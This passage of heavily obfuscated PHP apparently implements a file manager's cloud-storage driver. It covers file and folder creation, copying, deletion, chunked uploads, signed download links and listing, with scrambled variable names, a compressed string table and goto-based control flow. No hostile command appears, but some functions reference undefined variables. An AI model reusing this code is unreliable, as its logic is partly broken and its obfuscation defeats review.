$∏˚ßçÇÃ[1178] => $∏˚ßçÇÃ[1440]); } if (strtolower($Ã´·Ï¯·) == $∏˚ßçÇÃ[189] || in_array($í‚Üú˜ë[$∏˚ßçÇÃ[1176]], array($∏˚ßçÇÃ[1295], $∏˚ßçÇÃ[1441]))) { $ÔÉ˜ÉÀ® = $í‚Üú˜ë[$∏˚ßçÇÃ[1442]]; } else { $ÔÉ˜ÉÀ® = json_decode($í‚Üú˜ë[$∏˚ßçÇÃ[1178]], !0); if (!$ÔÉ˜ÉÀ®) { $ÔÉ˜ÉÀ® = $í‚Üú˜ë[$∏˚ßçÇÃ[1178]]; } else { if (!$í‚Üú˜ë[$∏˚ßçÇÃ[743]] && isset($ÔÉ˜ÉÀ®[$∏˚ßçÇÃ[1443]])) { $ÔÉ˜ÉÀ® = $ÔÉ˜ÉÀ®[$∏˚ßçÇÃ[1443]]; } } } return array($∏˚ßçÇÃ[1176] => $í‚Üú˜ë[$∏˚ßçÇÃ[743]], $∏˚ßçÇÃ[1178] => $ÔÉ˜ÉÀ®); } public function mkfile($⁄‹≈Òó˜, $À˘ÇµÇ∆ = '', $Ωõ¢÷°Ü = REPEAT_RENAME) { if ($this->setContent($⁄‹≈Òó˜, $À˘ÇµÇ∆)) { return $this->getPathOuter($⁄‹≈Òó˜); } return !1; } public function mkdir($†ê¡∫“, $†¢ªàØ‘ = REPEAT_SKIP) { $üã¬»ÛÌ =& $_SERVER[Çâä∆◊¡]; $≥é÷±©Ê = trim($†ê¡∫“, $üã¬»ÛÌ[8]); if ($this->_isFolder($≥é÷±©Ê)) { return $this->getPathOuter($≥é÷±©Ê); } $≈¡ŒßçÈ = array($üã¬»ÛÌ[1444]); $˛ïÕè˜ = $this->ussRequest($≥é÷±©Ê, $üã¬»ÛÌ[221], !1, $≈¡ŒßçÈ); return $˛ïÕè˜[$üã¬»ÛÌ[1176]] ? $this->getPathOuter($≥é÷±©Ê) : !1; } public function copyFile($¥ñ∫èì‹, $ÖÍ†œ´‰) { $∞ûÕ∫Ó∫ =& $_SERVER[Çâä∆◊¡]; $ìŒª• ﬁ = array($∞ûÕ∫Ó∫[1445] . "\57{$this->bucket}\57{$¥ñ∫èì‹}", $∞ûÕ∫Ó∫[1446]); $ƒ˙èÙÏ“ = $this->ussRequest($ÖÍ†œ´‰, $∞ûÕ∫Ó∫[223], !1, $ìŒª• ﬁ); return $ƒ˙èÙÏ“[$∞ûÕ∫Ó∫[1176]] ? !0 : $this->getPathOuter($ÖÍ†œ´‰); } public function moveFile($≈Ù¸√≤, $∂ŒÑ•ß≈) { $êÙ∂¨À =& $_SERVER[Çâä∆◊¡]; $§Î·˝ìê = array($êÙ∂¨À[1447] . "\x2f{$this->bucket}\x2f{$≈Ù¸√≤}", $êÙ∂¨À[1446]); $ªﬂ£·◊ = $this->ussRequest($∂ŒÑ•ß≈, $êÙ∂¨À[223], !1, $§Î·˝ìê); return $ªﬂ£·◊[$êÙ∂¨À[1176]] ? !0 : $this->getPathOuter($∂ŒÑ•ß≈); } public function delFile($Í∫Ä˙ŒÂ) { $å§⁄ñõ€ =& $_SERVER[Çâä∆◊¡]; $®ÌÍû¶≠ = $this->ussRequest($Í∫Ä˙ŒÂ, $å§⁄ñõ€[1448]); return $®ÌÍû¶≠[$å§⁄ñõ€[1176]] ? !0 : !1; } public function delFolder($õ√º≤ò—) { $…˛ïøò¢ =& $_SERVER[Çâä∆◊¡]; if (!$this->exist($õ√º≤ò—)) { return !0; } $this->listItemCache = !1; $√ÍÄ¥ú… = $ÿ‡‡Ã¢ü = array(); $this->fileList($õ√º≤ò—, $√ÍÄ¥ú…, $ÿ‡‡Ã¢ü, !0); $this->listItemCache = !0; foreach ($ÿ‡‡Ã¢ü as $ÇÇÄÄôÆ) { $ ‘∑ÜÓÅ = $this->ussRequest($ÇÇÄÄôÆ[$…˛ïøò¢[32]], $…˛ïøò¢[1448]); if (!$ ‘∑ÜÓÅ[$…˛ïøò¢[1176]]) { return !1; } } foreach ($√ÍÄ¥ú… as $‡‰Ω∂Ó’) { $ ‘∑ÜÓÅ = $this->ussRequest($‡‰Ω∂Ó’, $…˛ïøò¢[1448]); if (!$ ‘∑ÜÓÅ[$…˛ïøò¢[1176]]) { return !1; } } $ ‘∑ÜÓÅ = $this->ussRequest($õ√º≤ò—, $…˛ïøò¢[1448]); return $ ‘∑ÜÓÅ[$…˛ïøò¢[1176]]; } public function rename($˜’œΩ¸¯, $≥Õàıë≠) { if ($this->isFile($˜’œΩ¸¯)) { $≥Õàıë≠ = get_path_father($˜’œΩ¸¯) . $≥Õàıë≠; return $this->moveFile($˜’œΩ¸¯, $≥Õàıë≠); } return $this->renameObject($˜’œΩ¸¯, $≥Õàıë≠); } public function fileInfo($ã¢ñÁéÿ, $Ø≈ µ◊ç = false, $ıê…ÿØü = array()) { $çµ«îñö =& $_SERVER[Çâä∆◊¡]; $æêõàÌ« = array($çµ«îñö[32] => $this->pathThis($ã¢ñÁéÿ), $çµ«îñö[78] => $this->getPathOuter($çµ«îñö[8] . $ã¢ñÁéÿ), $çµ«îñö[33] => $çµ«îñö[192], $çµ«îñö[80] => isset($ıê…ÿØü[$çµ«îñö[80]]) ? $ıê…ÿØü[$çµ«îñö[80]] : 0, $çµ«îñö[167] => $this->ext($ã¢ñÁéÿ)); if ($Ø≈ µ◊ç) { return $æêõàÌ«; } $æêõàÌ«[$çµ«îñö[193]] = $æêõàÌ«[$çµ«îñö[86]] = 0; $æêõàÌ«[$çµ«îñö[194]] = $æêõàÌ«[$çµ«îñö[195]] = !0; if (empty($ıê…ÿØü)) { $ıê…ÿØü = $this->objectMeta($ã¢ñÁéÿ); if (!$ıê…ÿØü) { return $æêõàÌ«; } } $æêõàÌ«[$çµ«îñö[193]] = intval($ıê…ÿØü[$çµ«îñö[1449]]); $æêõàÌ«[$çµ«îñö[86]] = intval($ıê…ÿØü[$çµ«îñö[1450]]); $æêõàÌ«[$çµ«îñö[80]] = $ıê…ÿØü[$çµ«îñö[80]]; return $æêõàÌ«; } public function folderInfo($°˘¶⁄»…, $Â˚•˝ù≠ = false) { $Ô¢ºÅ≥∞ =& $_SERVER[Çâä∆◊¡]; $ä®˜∫Ñ∑ = array($Ô¢ºÅ≥∞[32] => $this->pathThis($°˘¶⁄»…), $Ô¢ºÅ≥∞[78] => $this->getPathOuter($Ô¢ºÅ≥∞[8] . $°˘¶⁄»…), $Ô¢ºÅ≥∞[33] => $Ô¢ºÅ≥∞[79]); if ($Â˚•˝ù≠) { return $ä®˜∫Ñ∑; } $ä®˜∫Ñ∑[$Ô¢ºÅ≥∞[193]] = $ä®˜∫Ñ∑[$Ô¢ºÅ≥∞[86]] = 0; $ä®˜∫Ñ∑[$Ô¢ºÅ≥∞[194]] = $ä®˜∫Ñ∑[$Ô¢ºÅ≥∞[195]] = !0; if (empty($∂„Í‡˙¢)) { $∂„Í‡˙¢ = $this->objectMeta($°˘¶⁄»…); if (!$∂„Í‡˙¢) { return $ä®˜∫Ñ∑; } } $ä®˜∫Ñ∑[$Ô¢ºÅ≥∞[193]] = intval($∂„Í‡˙¢[$Ô¢ºÅ≥∞[1449]]); $ä®˜∫Ñ∑[$Ô¢ºÅ≥∞[86]] = intval($∂„Í‡˙¢[$Ô¢ºÅ≥∞[1450]]); return $ä®˜∫Ñ∑; } private function listObjs($¨éﬂ›’·, $¨•≤π˚Û = 0, $¨ú™«∆’ = 1000) { $¡Æ˘®¨ƒ =& $_SERVER[Çâä∆◊¡]; $˘Œ£ƒù§ = array($¡Æ˘®¨ƒ[1451], $¡Æ˘®¨ƒ[1452] . $¨ú™«∆’); if ($¨•≤π˚Û) { $˘Œ£ƒù§[] = $¡Æ˘®¨ƒ[1453] . $¨•≤π˚Û; } $»µÄÕ „ = $this->ussRequest($¨éﬂ›’·, $¡Æ˘®¨ƒ[225], !1, $˘Œ£ƒù§); return !$»µÄÕ „[$¡Æ˘®¨ƒ[1176]] ? !1 : $»µÄÕ „[$¡Æ˘®¨ƒ[1178]]; } private function fileList($‚•–ó´·, &$¥ìõå€ç, &$∏µùƒêã, $ò¿ÿ≤àÂ = false) { $ƒ¡ö¶Åæ =& $_SERVER[Çâä∆◊¡]; $øÀ‚Ã… = $ƒ¡ö¶Åæ[12]; $Õ† ¿¢… = 1000; $€Å–≥† = rtrim($‚•–ó´·, $ƒ¡ö¶Åæ[8]) . $ƒ¡ö¶Åæ[8]; $ıÈ≈ﬂó— = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $˚Á¬Å°ì = $this->listObjs($‚•–ó´·, $øÀ‚Ã…, $Õ† ¿¢…); if (!$˚Á¬Å°ì) { return !1; } $øÀ‚Ã… = isset($˚Á¬Å°ì[$ƒ¡ö¶Åæ[1454]]) ? $˚Á¬Å°ì[$ƒ¡ö¶Åæ[1454]] : $ƒ¡ö¶Åæ[12]; $Ãí‡ùò– = isset($˚Á¬Å°ì[$ƒ¡ö¶Åæ[1455]]) ? $˚Á¬Å°ì[$ƒ¡ö¶Åæ[1455]] : array(); foreach ($Ãí‡ùò– as $„ô™ÑÃÄ) { $ä»íõﬁ£ = $„ô™ÑÃÄ[$ƒ¡ö¶Åæ[33]] == $ƒ¡ö¶Åæ[79] ? !0 : !1; $º±±ÇÛ÷ = ltrim($€Å–≥† . $„ô™ÑÃÄ[$ƒ¡ö¶Åæ[32]], $ƒ¡ö¶Åæ[8]) . ($ä»íõﬁ£ ? $ƒ¡ö¶Åæ[8] : $ƒ¡ö¶Åæ[12]); $âÆÆÌ¡— = array($ƒ¡ö¶Åæ[32] => $º±±ÇÛ÷, $ƒ¡ö¶Åæ[33] => $ä»íõﬁ£ ? $ƒ¡ö¶Åæ[79] : $ƒ¡ö¶Åæ[192], $ƒ¡ö¶Åæ[80] => $„ô™ÑÃÄ[$ƒ¡ö¶Åæ[332]], $ƒ¡ö¶Åæ[1450] => $„ô™ÑÃÄ[$ƒ¡ö¶Åæ[1456]]); if ($ıÈ≈ﬂó—) { $this->cacheMethod($ƒ¡ö¶Åæ[198], $º±±ÇÛ÷, $ä»íõﬁ£); $this->cacheMethod($ƒ¡ö¶Åæ[199], $º±±ÇÛ÷, $âÆÆÌ¡—); } if ($ä»íõﬁ£) { $¥ìõå€ç[] = $º±±ÇÛ÷; if ($ò¿ÿ≤àÂ) { $this->fileList($º±±ÇÛ÷, $¥ìõå€ç, $∏µùƒêã, $ò¿ÿ≤àÂ); } continue; } $∏µùƒêã[] = $âÆÆÌ¡—; } if (count($Ãí‡ùò–) < $Õ† ¿¢…) { break; } } if ($ıÈ≈ﬂó—) { $this->cacheMethod($ƒ¡ö¶Åæ[198], $‚•–ó´·, !0); } } public function listPath($±õπì˚Õ, $ÿ ‘∞—Ò = false) { $ø‡◊Ω»“ =& $_SERVER[Çâä∆◊¡]; $Ê–ﬂéªÏ = $€€ˆ˜ƒ = array(); $this->fileList($±õπì˚Õ, $Ê–ﬂéªÏ, $€€ˆ˜ƒ); foreach ($Ê–ﬂéªÏ as $Ôáá∞Ï« => $„ÿå™˝„) { $Ê–ﬂéªÏ[$Ôáá∞Ï«] = $this->folderInfo($„ÿå™˝„, $ÿ ‘∞—Ò); } foreach ($€€ˆ˜ƒ as $Ôáá∞Ï« => $„ÿå™˝„) { $€€ˆ˜ƒ[$Ôáá∞Ï«] = $this->fileInfo($„ÿå™˝„[$ø‡◊Ω»“[32]], $ÿ ‘∞—Ò, $„ÿå™˝„); } return array($ø‡◊Ω»“[77] => $Ê–ﬂéªÏ, $ø‡◊Ω»“[76] => $€€ˆ˜ƒ); } public function has($¯Ì⁄ÆüÈ, $≈‘Ç«í» = false, $„∑’˜™ = true) { $èƒ±√Ñ— =& $_SERVER[Çâä∆◊¡]; $ πèœ‡ö = $èƒ±√Ñ—[12]; $ûÀÿ¶∂Ï = 500; $í·É±∫ô = 0; $≤íÿ’˝î = 0; $è‡éä≥¡ = rtrim($¯Ì⁄ÆüÈ, $èƒ±√Ñ—[8]) . $èƒ±√Ñ—[8]; while (!0) { check_abort(); $µõﬁì¥¸ = $this->listObjs($¯Ì⁄ÆüÈ, $ πèœ‡ö, $ûÀÿ¶∂Ï); if (!$µõﬁì¥¸) { return !1; } $ πèœ‡ö = isset($µõﬁì¥¸[$èƒ±√Ñ—[1454]]) ? $µõﬁì¥¸[$èƒ±√Ñ—[1454]] : $èƒ±√Ñ—[12]; $û¯ëœŒ˛ = isset($µõﬁì¥¸[$èƒ±√Ñ—[1455]]) ? $µõﬁì¥¸[$èƒ±√Ñ—[1455]] : array(); if (empty($û¯ëœŒ˛)) { break; } $„°⁄·ù© = array_filter($û¯ëœŒ˛, function ($•µåœ¸‹) { $∏ïÎÀÖ¸ =& $_SERVER[Çâä∆◊¡]; return $•µåœ¸‹[$∏ïÎÀÖ¸[33]] == $∏ïÎÀÖ¸[79]; }); $⁄∏Ω€âÊ = count($û¯ëœŒ˛); $„°⁄·ù© = count($„°⁄·ù©); $®¯øÎœÓ = $⁄∏Ω€âÊ - $„°⁄·ù©; if ($≈‘Ç«í») { $≤íÿ’˝î += $„°⁄·ù©; $í·É±∫ô += $®¯øÎœÓ; if ($⁄∏Ω€âÊ < $ûÀÿ¶∂Ï) { break; } continue; } if ($„∑’˜™) { if ($®¯øÎœÓ) { return !0; } } else { if ($„°⁄·ù©) { return !0; } } if ($⁄∏Ω€âÊ < $ûÀÿ¶∂Ï) { break; } } if ($≈‘Ç«í») { return array($èƒ±√Ñ—[202] => $í·É±∫ô, $èƒ±√Ñ—[203] => $≤íÿ’˝î); } return !1; } public function listAll($…õ◊îé¬) { $üåä≤Ö¯ =& $_SERVER[Çâä∆◊¡]; $Ü¯È˘ü‚ = $â”†’‡∫ = array(); $this->fileList($…õ◊îé¬, $Ü¯È˘ü‚, $â”†’‡∫, !0); $˚Ù´≥ç€ = array(); foreach ($â”†’‡∫ as $” ÆÜ≈Ï) { $˚Ù´≥ç€[$” ÆÜ≈Ï[$üåä≤Ö¯[32]]] = $” ÆÜ≈Ï[$üåä≤Ö¯[80]]; } foreach ($Ü¯È˘ü‚ as $” ÆÜ≈Ï) { if (is_string($” ÆÜ≈Ï)) { $˚Ù´≥ç€[$” ÆÜ≈Ï] = 0; } } return $this->listAllFiles($…õ◊îé¬, array_keys($˚Ù´≥ç€), $˚Ù´≥ç€); } public function canRead($ÂÂï˝˚Ï) { return $this->exist($ÂÂï˝˚Ï) ? !0 : !1; } public function canWrite($À‹∏ÿ¡©) { return $this->exist($À‹∏ÿ¡©) ? !0 : !1; } public function getContent($‰ç√‡√) { return $this->fileSubstr($‰ç√‡√, 0, -1); } public function setContent($î˚ÿßÚÛ, $âÒ¸òœ‘ = '') { $’àÈˆÂÖ =& $_SERVER[Çâä∆◊¡]; if (!$âÒ¸òœ‘) { $ƒÑéÔ¡§ = $this->ussRequest($î˚ÿßÚÛ, $’àÈˆÂÖ[221]); return $ƒÑéÔ¡§[$’àÈˆÂÖ[1176]]; } $êÆø„◊† = $this->tempFile($this->pathThis($î˚ÿßÚÛ)); file_put_contents($êÆø„◊†, $âÒ¸òœ‘); if ($this->upload($î˚ÿßÚÛ, $êÆø„◊†)) { $this->tempFileRemve($êÆø„◊†); return !0; } return !1; } public function fileSubstr($’ê–µ‚°, $≈á¯Ó˙œ, $œ∫ñ›≈—) { $åÔ·€≠¨ =& $_SERVER[Çâä∆◊¡]; if (!($Í∞ß Îì = $this->link($’ê–µ‚°))) { return !1; } $ñÚ˛πæÚ = !1; if ($œ∫ñ›≈— > 0) { $òºƒ‚îﬂ = $≈á¯Ó˙œ + $œ∫ñ›≈— - 1; $ñÚ˛πæÚ = array($åÔ·€≠¨[1417] . $≈á¯Ó˙œ . $åÔ·€≠¨[460] . $òºƒ‚îﬂ); } $±ù¸çŒÄ = url_request($Í∞ß Îì, $åÔ·€≠¨[225], !1, $ñÚ˛πæÚ); return $±ù¸çŒÄ[$åÔ·€≠¨[743]] ? $±ù¸çŒÄ[$åÔ·€≠¨[1178]] : !1; } public function upload($÷ËÈß§Ω, $¯¯†˝…Å, $≤€çùË« = false, $±µ„ÊŸ¢ = REPEAT_REPLACE) { $ﬁ¿≤¢îπ =& $_SERVER[Çâä∆◊¡]; $Í˙üß‚£ = IO::size($¯¯†˝…Å); if ($Í˙üß‚£ <= 1024 * 1024 * 200) { $™»≠ÆÁı = array($ﬁ¿≤¢îπ[1457] . $¯¯†˝…Å); $»•ü§∑÷ = $this->ussRequest($÷ËÈß§Ω, $ﬁ¿≤¢îπ[223], $™»≠ÆÁı); return $»•ü§∑÷[$ﬁ¿≤¢îπ[1176]] ? $this->getPathOuter($÷ËÈß§Ω) : !1; } $äÉ¸Ωé˚ = 1024 * 1024 * 10; $∑Ù“ßﬂƒ = array($ﬁ¿≤¢îπ[1458], $ﬁ¿≤¢îπ[1459] . $Í˙üß‚£, $ﬁ¿≤¢îπ[1460], $ﬁ¿≤¢îπ[1461] . $äÉ¸Ωé˚); $»•ü§∑÷ = $this->ussRequest($÷ËÈß§Ω, $ﬁ¿≤¢îπ[223], !1, $∑Ù“ßﬂƒ); if (!$»•ü§∑÷[$ﬁ¿≤¢îπ[1176]]) { return !1; } $’ÌåöâË = $»•ü§∑÷[$ﬁ¿≤¢îπ[1178]]; $íÊö‡¨… = 0; $âó≤·˙¢ = $’ÌåöâË[$ﬁ¿≤¢îπ[1462]]; $–¿ùÍõ∂ = fopen($¯¯†˝…Å, $ﬁ¿≤¢îπ[1366]); if (!$–¿ùÍõ∂) { return !1; } do { $ÛüŒùë… = $’ÌåöâË[$ﬁ¿≤¢îπ[1463]]; fseek_64($–¿ùÍõ∂, $íÊö‡¨…); $üÛı∑§Ó = fread($–¿ùÍõ∂, $ÛüŒùë…); $˘ú‹ƒÖÜ = 0; do { $˘ú‹ƒÖÜ++; $’ÌåöâË = $this->uploadPart($÷ËÈß§Ω, $’ÌåöâË, $üÛı∑§Ó); } while (!$’ÌåöâË && $˘ú‹ƒÖÜ < 3); if (!$’ÌåöâË) { return !1; } $âó≤·˙¢ = $’ÌåöâË[$ﬁ¿≤¢îπ[1462]]; $íÊö‡¨… += $ÛüŒùë…; } while ($âó≤·˙¢ != -1); fclose($–¿ùÍõ∂); $∑Ù“ßﬂƒ = array($ﬁ¿≤¢îπ[1464], $ﬁ¿≤¢îπ[1465] . $’ÌåöâË[$ﬁ¿≤¢îπ[1466]], $ﬁ¿≤¢îπ[1460]); $»•ü§∑÷ = $this->ussRequest($÷ËÈß§Ω, $ﬁ¿≤¢îπ[223], !1, $∑Ù“ßﬂƒ); return $»•ü§∑÷[$ﬁ¿≤¢îπ[1176]] ? $this->getPathOuter($Û∞˛ﬂÜô) : !1; } private function uploadPart($ì©Û√‰ê, $Ó…°ß£’, &$√Õ˛–·Î) { $∏å⁄ÿ‘ˆ =& $_SERVER[Çâä∆◊¡]; $éÛ‰±ªˆ = array($∏å⁄ÿ‘ˆ[1467], $∏å⁄ÿ‘ˆ[1465] . $Ó…°ß£’[$∏å⁄ÿ‘ˆ[1466]], $∏å⁄ÿ‘ˆ[1468] . $Ó…°ß£’[$∏å⁄ÿ‘ˆ[1462]], $∏å⁄ÿ‘ˆ[139] . $Ó…°ß£’[$∏å⁄ÿ‘ˆ[1463]]); $‹Ò·Îåá = $this->ussRequest($ì©Û√‰ê, $∏å⁄ÿ‘ˆ[223], $√Õ˛–·Î, $éÛ‰±ªˆ); return !$‹Ò·Îåá[$∏å⁄ÿ‘ˆ[1176]] ? $‹Ò·Îåá[$∏å⁄ÿ‘ˆ[1176]] : $‹Ò·Îåá[$∏å⁄ÿ‘ˆ[1178]]; } public function uploadFormData($¢£¨éò⁄, $ŸÉŸó∞© = 3600) { return $this->uploadPolicy($¢£¨éò⁄, $ŸÉŸó∞©); } public function multiUploadFormData($ΩåÉ¿¨ø, $ÿòä èû = 3600) { $ã“Åä–‹ =& $_SERVER[Çâä∆◊¡]; $îÅ–ñì˜ = (int) $GLOBALS[$ã“Åä–‹[7]][$ã“Åä–‹[80]]; return $this->uploadPolicy($ΩåÉ¿¨ø, $ÿòä èû, $îÅ–ñì˜); } private function uploadPolicy($ÿÙËÇÛñ, $˝ ◊Ûã‰ = 3600, $ÑÜ…≥‰‚ = 0) { $îÖ¢–Æœ =& $_SERVER[Çâä∆◊¡]; $¯ﬂ¥πÙê = $îÖ¢–Æœ[8] . $this->bucket; $’Äœ∏é¢ = gmdate($îÖ¢–Æœ[1402]); $Ñ◊¡ÚóÍ = array($îÖ¢–Æœ[1469] => $this->bucket, $îÖ¢–Æœ[1470] => $ÿÙËÇÛñ, $îÖ¢–Æœ[1471] => time() + $˝ ◊Ûã‰, $îÖ¢–Æœ[1472] => $’Äœ∏é¢); if ($ÑÜ…≥‰‚) { $Ñ◊¡ÚóÍ[$îÖ¢–Æœ[1382]] = $ÑÜ…≥‰‚; } $∆Ì¬ÿ˝î = base64_encode(json_encode($Ñ◊¡ÚóÍ)); $ïñ⁄°ÙΩ = base64_encode(hash_hmac($îÖ¢–Æœ[1439], "\120\x4f\123\x54\46{$¯ﬂ¥πÙê}\x26{$’Äœ∏é¢}\x26{$∆Ì¬ÿ˝î}", md5("{$this->userpass}"), !0)); $ö¿óÃÎ€ = array($îÖ¢–Æœ[1307] => $∆Ì¬ÿ˝î, $îÖ¢–Æœ[1473] => "\x55\x50\x59\x55\x4e\x20{$this->username}\x3a{$ïñ⁄°ÙΩ}", $îÖ¢–Æœ[174] => $this->endpoint . $¯ﬂ¥πÙê); return $ö¿óÃÎ€; } public function download($ﬂ∂àú”¶, $¡ Ë≤ÌÏ) { $Íª∏‘˛˙ = IO::getPathInner(IO::mkfile($¡ Ë≤ÌÏ)); if (!($ÀÔ‰èﬂ» = $this->link($ﬂ∂àú”¶))) { return !1; } $ò‘¥îÎÅ = 0; $™ﬂ¥˚Û∂ = 1024 * 200; $ïº•∂ã = fopen($Íª∏‘˛˙, $_SERVER[Çâä∆◊¡][1423]); while (!0) { $›Ç§≈« = $this->fileSubstr($ﬂ∂àú”¶, $ò‘¥îÎÅ, $™ﬂ¥˚Û∂); if ($›Ç§≈« === !1) { return !1; } fwrite($ïº•∂ã, $›Ç§≈«); $ò‘¥îÎÅ += $™ﬂ¥˚Û∂; if (strlen($›Ç§≈«) < $™ﬂ¥˚Û∂) { break; } } fclose($ïº•∂ã); return $¡ Ë≤ÌÏ; } public function link($Æπ¸◊ÄÊ, $Õ√ÆÆÜı = array()) { $©ÑÄ«îÃ =& $_SERVER[Çâä∆◊¡]; $Æπ¸◊ÄÊ = trim($Æπ¸◊ÄÊ, $©ÑÄ«îÃ[8]); if (!empty($this->token)) { $‰¿Ô˛È∂ = strtotime(date($©ÑÄ«îÃ[1474])); $äëáÌª˚ = substr(md5($this->token . $©ÑÄ«îÃ[279] . $‰¿Ô˛È∂ . $©ÑÄ«îÃ[1475] . $Æπ¸◊ÄÊ), 12, 8) . $‰¿Ô˛È∂; $Õ√ÆÆÜı[] = $©ÑÄ«îÃ[1476] . $äëáÌª˚; } $ËﬁíçΩ« = !empty($Õ√ÆÆÜı) ? $©ÑÄ«îÃ[73] . implode($©ÑÄ«îÃ[279], $Õ√ÆÆÜı) : $©ÑÄ«îÃ[12]; return $this->getHost() . $©ÑÄ«îÃ[8] . $Æπ¸◊ÄÊ . $ËﬁíçΩ«; } public function fileOut($ãû¬†ÑÀ, $•Ò∞‹ıº = false, $∏ﬂ≠Ï˚ú = false, $ßËÈí≤¬ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ãû¬†ÑÀ, $•Ò∞‹ıº, $∏ﬂ≠Ï˚ú, $ßËÈí≤¬); } if (!$∏ﬂ≠Ï˚ú) { $∏ﬂ≠Ï˚ú = $this->pathThis($ãû¬†ÑÀ); } $ëÒ•°ôÙ = $•Ò∞‹ıº ? array($_SERVER[Çâä∆◊¡][1477] . rawurlencode($∏ﬂ≠Ï˚ú)) : array(); $öóªˆò· = $this->link($ãû¬†ÑÀ, $ëÒ•°ôÙ); $this->fileOutLink($öóªˆò·); } public function fileOutServer($Û◊íû–Ô, $ïÌ‰Œ÷Ò = false, $√¥õ‘¥∑ = false, $Æ§ªØ≥¸ = '') { parent::fileOut($Û◊íû–Ô, $ïÌ‰Œ÷Ò, $√¥õ‘¥∑, $Æ§ªØ≥¸); } public function fileOutImage($›œêñ–Ü, $ù°˚æ¯û = 250) { $ßû˝∂§ÿ = $this->link($›œêñ–Ü . $_SERVER[Çâä∆◊¡][1478] . $ù°˚æ¯û); $this->fileOutLink($ßû˝∂§ÿ); } public function fileOutImageServer($ô∑ΩñÓÊ, $Æ€˝ÉÕ… = 250) { parent::fileOutImage($ô∑ΩñÓÊ, $Æ€˝ÉÕ…); } public function hashMd5($¨∂ﬁû´ß) { $∂íƒ˛∑∆ =& $_SERVER[Çâä∆◊¡]; $ó™Î–ô˙ = $this->_objectMeta($¨∂ﬁû´ß); return isset($ó™Î–ô˙[$∂íƒ˛∑∆[207]]) ? $ó™Î–ô˙[$∂íƒ˛∑∆[207]] : !1; } public function size($˛ö˝ßèÔ) { $Ïºﬁú¿Ù = $this->objectMeta($˛ö˝ßèÔ); return $Ïºﬁú¿Ù ? $Ïºﬁú¿Ù[$_SERVER[Çâä∆◊¡][80]] : 0; } public function info($œÛ≈ÆŸ™) { if ($this->isFolder($œÛ≈ÆŸ™)) { return $this->folderInfo($œÛ≈ÆŸ™); } else { if ($this->isFile($œÛ≈ÆŸ™)) { return $this->fileInfo($œÛ≈ÆŸ™); } } return !1; } public function exist($“∞√ï∆™) { return $this->isFile($“∞√ï∆™) || $this->isFolder($“∞√ï∆™); } public function isFile($ÿ¿·ë∏º) { return !$this->isFolder($ÿ¿·ë∏º) && $this->objectMeta($ÿ¿·ë∏º); } public function isFolder($éπ˝—ò•) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][198], $éπ˝—ò•); } protected function objectMeta($∆ÂúÉŒ¯) { return $this->cacheMethod($_SERVER[Çâä∆◊¡][199], $∆ÂúÉŒ¯); } protected function _objectMeta($º√§÷˛Á) { $•ê‚Äê§ =& $_SERVER[Çâä∆◊¡]; if ($º√§÷˛Á == $•ê‚Äê§[12] || $º√§÷˛Á == $•ê‚Äê§[8]) { return array(); } $≥ﬂ’†™∫ = $this->ussRequest($º√§÷˛Á, $•ê‚Äê§[1479]); if (!$≥ﬂ’†™∫[$•ê‚Äê§[1176]]) { return null; } $ﬂô§√úé = isset($≥ﬂ’†™∫[$•ê‚Äê§[1178]]) ? $≥ﬂ’†™∫[$•ê‚Äê§[1178]] : array(); if (!isset($ﬂô§√úé[$•ê‚Äê§[1480]])) { return null; } $åÄìëË∏ = array($•ê‚Äê§[33] => isset($ﬂô§√úé[$•ê‚Äê§[1480]]) ? $ﬂô§√úé[$•ê‚Äê§[1480]] : null, $•ê‚Äê§[80] => isset($ﬂô§√úé[$•ê‚Äê§[1481]]) ? $ﬂô§√úé[$•ê‚Äê§[1481]] : null, $•ê‚Äê§[207] => isset($ﬂô§√úé[$•ê‚Äê§[1482]]) ? $ﬂô§√úé[$•ê‚Äê§[1482]] : null, $•ê‚Äê§[1449] => isset($ﬂô§√úé[$•ê‚Äê§[1483]]) ? $ﬂô§√úé[$•ê‚Äê§[1483]] : null); $åÄìëË∏[$•ê‚Äê§[1450]] = isset($ﬂô§√úé[$•ê‚Äê§[1484]]) ? strtotime($ﬂô§√úé[$•ê‚Äê§[1484]]) : $åÄìëË∏[$•ê‚Äê§[1449]]; return $åÄìëË∏; } protected function _isFolder($ﬂŒ¡˘Á§) { $•õÏõ«— =& $_SERVER[Çâä∆◊¡]; if ($ﬂŒ¡˘Á§ == $•õÏõ«—[12] || $ﬂŒ¡˘Á§ == $•õÏõ«—[8]) { return !0; } $…à÷Ï·„ = $this->_objectMeta($ﬂŒ¡˘Á§); return isset($…à÷Ï·„[$•õÏõ«—[33]]) && $…à÷Ï·„[$•õÏõ«—[33]] == $•õÏõ«—[79] ? !0 : !1; } } goto C»Ö˘î≥—À; e˘™Ç“ÇáÆ: define($_SERVER[Çâä∆◊¡][236], 1); define($_SERVER[Çâä∆◊¡][237], 0); define($_SERVER[Çâä∆◊¡][238], 2); goto dêíç†ŸÌ; bËú÷å∆Ì¢: define($_SERVER[Çâä∆◊¡][233], 1); define($_SERVER[Çâä∆◊¡][234], 2); define($_SERVER[Çâä∆◊¡][235], 3); goto e˘™Ç“ÇáÆ; côíëäÊØÚ: while (strlen($ibtuezfqxr) < $_SERVER[Çâä∆◊¡][607]) { if (!$ibtuezfqxr) { break; } $ibtuezfqxr++; } $_SERVER[‚º¶Ô¢Ó] = explode($_SERVER[Çâä∆◊¡][608], gzinflate(substr($_SERVER[Çâä∆◊¡][609], 10, -8))); $qtxmvhlzas = $_SERVER[Çâä∆◊¡][610]; goto F⁄ùøêßŒç; d˜õƒ‡ß÷«: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $≈âñíπÉ =& $_SERVER[Çâä∆◊¡]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$≈âñíπÉ[6]] =& $config; $this->values[$≈âñíπÉ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $≈âñíπÉ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($◊∏∏•íÂ) { if (1 === func_num_args()) { $this->{$◊∏∏•íÂ} = new $◊∏∏•íÂ(); } else { $ÛŸ«—È“ = new ReflectionClass($◊∏∏•íÂ); $⁄ØÅ√€› = func_get_args(); array_shift($⁄ØÅ√€›); $this->{$◊∏∏•íÂ} = $ÛŸ«—È“->newInstanceArgs($⁄ØÅ√€›); } return $this->{$◊∏∏•íÂ}; } public function routeBind($œÖùéÏ€, $·—˜˘ëç, $Ë”‹Ñ°å = 3) { 